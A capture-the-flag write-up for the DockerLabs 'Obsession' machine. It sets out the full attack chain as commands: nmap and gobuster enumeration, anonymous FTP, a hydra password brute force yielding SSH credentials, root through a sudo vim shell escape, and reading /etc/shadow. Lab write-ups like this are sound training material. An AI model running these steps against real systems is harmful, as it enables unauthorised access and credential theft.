<h1 align="center">🎯 Obsession — Attack Path Analysis</h1>
<p align="center">
  <img src="https://img.shields.io/badge/Platform-DockerLabs-blue?style=flat-square" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square" />
  <img src="https://img.shields.io/badge/Status-Completed-success?style=flat-square" />
  <img src="https://img.shields.io/badge/OS-Linux-informational?style=flat-square" />
</p>

<p align="center">
  <b>Researcher:</b> Ackerman &nbsp;|&nbsp; <b>Target IP:</b> 172.17.0.2
</p>

---

## 📖 Table of Contents

- [Description](#-description)
- [Attack Tools](#-attack-tools)
- [Reconnaissance](#-reconnaissance)
- [FTP Enumeration](#-ftp-enumeration)
- [Web Enumeration](#-web-enumeration)
- [Credential Bruteforce](#-credential-bruteforce)
- [File Analysis](#-file-analysis)
- [Initial Access](#-initial-access)
- [Local Enumeration](#-local-enumeration)
- [Privilege Escalation](#-privilege-escalation)
- [Post Exploitation](#-post-exploitation)
- [Loot](#-loot)
- [Attack Chain](#-attack-chain)

---

## 📝 Description

A machine focused on **service enumeration**, **initial access via brute force**, and **privilege escalation** through a sudo misconfiguration. The path chains together anonymous FTP disclosure, web content discovery, credential bruteforcing, and a classic GTFOBins-style privilege escalation via `vim`.

---

## 🛠 Attack Tools

| Tool | Purpose |
|---|---|
| **Nmap** | Port & service scanning |
| **Gobuster** | Web directory enumeration |
| **Hydra** | Credential bruteforcing |
| **FTP Client** | File transfer / enumeration |
| **OpenSSH** | Remote access |
| **ExifTool** | Metadata / steganography analysis |
| **Vim** | Privilege escalation vector |
| **SecLists** | Wordlists |

---

## 🔍 Reconnaissance

Initial full port scan:

```bash
nmap -sV -sC -p- 172.17.0.2
```

<!-- ![Nmap scan results](screenshots/01-nmap-scan.png) -->

**Open services:**

| Port | Service | Version |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 9.6p1 |
| 80/tcp | HTTP | Apache 2.4.58 |

> ⚠️ Anonymous FTP access was enabled — first point of entry.

---

## 📂 FTP Enumeration

Anonymous login:

```bash
ftp 172.17.0.2
```

<!-- ![Anonymous FTP login](screenshots/02-ftp-anon-login.png) -->

Listing files:

```bash
ls
```

**Files found:**
- `chat-gonza.txt`
- `pendientes.txt`

Downloading:

```bash
get chat-gonza.txt
get pendientes.txt
```

<!-- ![FTP files downloaded](screenshots/03-ftp-files.png) -->

**Key findings:**
- Username identified: **`russoski`**
- Internal notes referencing insecure permissions

---

## 🌐 Web Enumeration

Directory brute-forcing:

```bash
gobuster dir -u http://172.17.0.2 -w /opt/SecLists/Discovery/Web-Content/common.txt
```

<!-- ![Gobuster results](screenshots/04-gobuster.png) -->

**Interesting paths found:**
- `/backup`
- `/important`

---

## 🔑 Credential Bruteforce

Bruteforce against FTP using the identified username:

```bash
hydra -l russoski -P /opt/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt ftp://172.17.0.2
```

<!-- ![Hydra bruteforce success](screenshots/05-hydra.png) -->

**Credentials found:**

```text
russoski:iloveme
```

---

## 📑 File Analysis

Authenticated FTP session reveals more directories:

```bash
cd Documentos
ls
cd ../Proyectos
ls
```

<!-- ![Authenticated FTP file listing](screenshots/06-ftp-authenticated.png) -->

**Files found:**
- `Nikola Tesla.jpg`
- `README.md`
- `Strong-Credentials.py`

Download:

```bash
get "Nikola Tesla.jpg"
get README.md
get Strong-Credentials.py
```

Analysis:

```bash
strings "Nikola Tesla.jpg"
exiftool "Nikola Tesla.jpg"
cat README.md
cat Strong-Credentials.py
```

<!-- ![Exiftool metadata analysis](screenshots/07-exiftool.png) -->

---

## 🚪 Initial Access

SSH login with the credentials obtained:

```bash
ssh russoski@172.17.0.2
```

<!-- ![SSH login success](screenshots/08-ssh-login.png) -->

Successful authentication as **`russoski`**.

---

## 🖥 Local Enumeration

Basic post-access checks:

```bash
whoami
id
hostname
sudo -l
```

<!-- ![Sudo permissions check](screenshots/09-sudo-l.png) -->

**Sudo misconfiguration found:**

```text
(root) NOPASSWD: /usr/bin/vim
```

---

## ⬆️ Privilege Escalation

Escalating privileges by spawning a shell from `vim`:

```bash
sudo vim -c ':!/bin/bash'
```

<!-- ![Privilege escalation via vim](screenshots/10-privesc-vim.png) -->

Verification:

```bash
whoami
id
```

**Root access confirmed:**

```text
root
uid=0(root) gid=0(root)
```

---

## 🔎 Post Exploitation

Searching for sensitive files:

```bash
find / -name "*.txt" 2>/dev/null
ls -la /root
cat /root/*
cat /etc/shadow
```

<!-- ![Root filesystem enumeration](screenshots/11-post-exploitation.png) -->

**Findings:**
- `Video-Nagore-Fernandez.txt`
- `.root-passwd.txt`
- `backup.txt`
- `/etc/shadow`

Hidden URL discovered:

```text
https://www.youtube.com/shorts/_v8GzGReTAk
```

---

## 💰 Loot

All collected artifacts are stored in [`loot/`](loot/):

- `chat-gonza.txt`
- `pendientes.txt`
- `Nikola Tesla.jpg`
- `README.md`
- `Strong-Credentials.py`
- `Video-Nagore-Fernandez.txt`
- `/etc/shadow`

---

## 🔗 Attack Chain

```text
Recon → FTP Enum → Information Disclosure → Gobuster → Hydra → SSH → Sudo Abuse → Root
```

---

<p align="center"><i>Written for educational purposes as part of DockerLabs practice.</i></p>
